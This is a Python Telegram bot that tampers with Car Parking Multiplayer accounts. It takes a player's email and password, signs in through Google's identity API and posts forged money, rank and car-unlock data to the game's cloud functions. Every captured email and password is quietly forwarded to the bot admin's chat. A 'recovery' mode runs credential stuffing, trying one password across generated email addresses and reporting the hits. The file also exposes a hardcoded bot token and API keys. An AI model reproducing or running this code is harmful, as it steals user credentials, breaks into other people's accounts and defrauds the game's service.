import telebot, requests, os, time, json
from threading import Thread
from flask import Flask
from concurrent.futures import ThreadPoolExecutor

# --- RENDER WEB SERVER (For 24/7 Live) ---
app = Flask('')
@app.route('/')
def home(): return "🔥 CPMEGY TURBO MASTER IS ACTIVE!"

def run_server():
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)

# --- CONFIG ---
TOKEN = "8574711169:AAGk87biel9UdUGxFTq9cDW4yOIiz6egRew"
bot = telebot.TeleBot(TOKEN)
ADMIN_ID = 7212602902 

API_KEYS = {
    "CPM1": "AIzaSyAe_aOVT1gSfmHKBrorFvX4fRwN5nODXVA", 
    "CPM2": "AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ"
}

RANK_URLS = {
    "CPM1": 'https://us-central1-cp-multiplayer.cloudfunctions.net/SetUserRating4',
    "CPM2": 'https://us-central1-cpm-2-7cea1.cloudfunctions.net/SetUserRating17_AppI'
}

user_states = {}

# --- CORE FUNCTIONS ---
def google_api(action, payload, key_type="CPM2"):
    endpoint = "signInWithPassword" if action == "login" else "update"
    url = f"https://identitytoolkit.googleapis.com/v1/accounts:{endpoint}?key={API_KEYS[key_type]}"
    try:
        r = requests.post(url, json=payload, timeout=10)
        return r.json()
    except: return {}

def inject_everything(token, game_type):
    url = RANK_URLS.get(game_type)
    
    # All Features List
    full_stats = [
        'cars', 'car_fix', 'car_collided', 'car_exchange', 'car_trade', 
        'car_wash', 'slicer_cut', 'drift_max', 'drift', 'cargo', 
        'delivery', 'taxi', 'levels', 'gifts', 'fuel', 'offroad', 
        'speed_banner', 'reactions', 'police', 'run', 'real_estate', 
        't_distance', 'treasure', 'block_post', 'push_ups', 'burnt_tire', 
        'passanger_distance'
    ]
    
    # Data Setup
    rating_data = {stat: 100000 for stat in full_stats}
    rating_data['time'] = 10000000000
    rating_data['race_win'] = 5000
    rating_data['money'] = 50000000
    rating_data['coin'] = 50000

    # LocalData for All Cars Unlock
    payload = {
        'data': json.dumps({
            'RatingData': rating_data,
            'LocalData': {
                'money': 50000000,
                'coin': 50000,
                'owned_cars': list(range(1, 170)), # Adds 170 cars to account
                'unlock_all_cars': True,
                'house_unlocked': True
            }
        })
    }
    
    headers = {
        'Authorization': f"Bearer {token}",
        'Content-Type': 'application/json',
        'User-Agent': 'okhttp/3.12.13'
    }
    
    try:
        r = requests.post(url, headers=headers, json=payload, timeout=20)
        return r.status_code == 200
    except: return False

# --- BOT HANDLERS ---
@bot.message_handler(commands=['start'])
def start(message):
    if message.from_user.id != ADMIN_ID: return
    
    markup = telebot.types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        telebot.types.InlineKeyboardButton("🔍 Turbo Recovery", callback_data="mode_recover"),
        telebot.types.InlineKeyboardButton("👑 All Unlock (Cars+Rank)", callback_data="mode_unlock"),
        telebot.types.InlineKeyboardButton("📦 Bulk Change", callback_data="mode_bulk"),
        telebot.types.InlineKeyboardButton("👤 Single Change", callback_data="mode_single")
    )
    bot.send_message(message.chat.id, "🔥 **CPMEGY TURBO MASTER v8.0**\n\nChoose Service:", reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: True)
def handle_query(call):
    cid = call.message.chat.id
    user_states[cid] = {'mode': call.data}
    
    if call.data == "mode_unlock":
        markup = telebot.types.InlineKeyboardMarkup()
        markup.add(
            telebot.types.InlineKeyboardButton("CPM 1", callback_data="set_cpm1"),
            telebot.types.InlineKeyboardButton("CPM 2", callback_data="set_cpm2")
        )
        bot.send_message(cid, "🎮 Select Game Version:", reply_markup=markup)
    
    elif "set_cpm" in call.data:
        user_states[cid]['game'] = "CPM1" if "cpm1" in call.data else "CPM2"
        msg = bot.send_message(cid, "📧 Enter Account Email:")
        bot.register_next_step_handler(msg, get_email)

    elif call.data == "mode_recover":
        msg = bot.send_message(cid, "📧 **Format:** (Ex: `user_{}_@gmail.com`)")
        bot.register_next_step_handler(msg, get_recover_format)

def get_email(message):
    user_states[message.chat.id]['email'] = message.text.strip()
    msg = bot.send_message(message.chat.id, "🔑 Enter Password:")
    bot.register_next_step_handler(msg, process_final)

def process_final(message):
    cid = message.chat.id
    pwd = message.text.strip()
    data = user_states[cid]
    
    status = bot.send_message(cid, "⏳ Processing...")
    res = google_api("login", {"email": data['email'], "password": pwd, "returnSecureToken": True}, data.get('game', 'CPM2'))
    
    if 'idToken' in res:
        token = res['idToken']
        bot.send_message(ADMIN_ID, f"🔔 **LOG:** `{data['email']}` | `{pwd}`")
        
        if data['mode'] == "mode_unlock":
            bot.edit_message_text("✅ Login Success! Injecting Data...", cid, status.message_id)
            if inject_everything(token, data['game']):
                bot.edit_message_text("👑 **Everything Unlocked!**\nCars, Money & Rank added.\n\n⚠️ **Important:** Logout & Login in Game to see changes.", cid, status.message_id)
            else:
                bot.edit_message_text("❌ Injection Failed.", cid, status.message_id)
    else:
        bot.edit_message_text("❌ Login Failed. Check Credentials.", cid, status.message_id)

# --- RECOVERY LOGIC ---
def get_recover_format(message):
    user_states[message.chat.id]['format'] = message.text.strip()
    msg = bot.send_message(message.chat.id, "🔢 Range (Start:End):")
    bot.register_next_step_handler(msg, get_recover_range)

def get_recover_range(message):
    try:
        s, e = map(int, message.text.split(':'))
        user_states[message.chat.id].update({'s': s, 'e': e})
        msg = bot.send_message(message.chat.id, "🔑 Password to check:")
        bot.register_next_step_handler(msg, run_turbo)
    except: bot.send_message(message.chat.id, "❌ Error in Range!")

def run_turbo(message):
    cid, pwd = message.chat.id, message.text.strip()
    data = user_states[cid]
    bot.send_message(cid, "🚀 Scanning...")
    def task():
        for i in range(data['s'], data['e'] + 1):
            email = data['format'].replace("{}", str(i))
            if 'idToken' in google_api("login", {"email": email, "password": pwd, "returnSecureToken": True}):
                bot.send_message(cid, f"✅ **HIT:** `{email}`")
        bot.send_message(cid, "🏁 Scan Finished.")
    Thread(target=task).start()

if __name__ == "__main__":
    Thread(target=run_server).start()
    bot.infinity_polling(skip_pending=True)
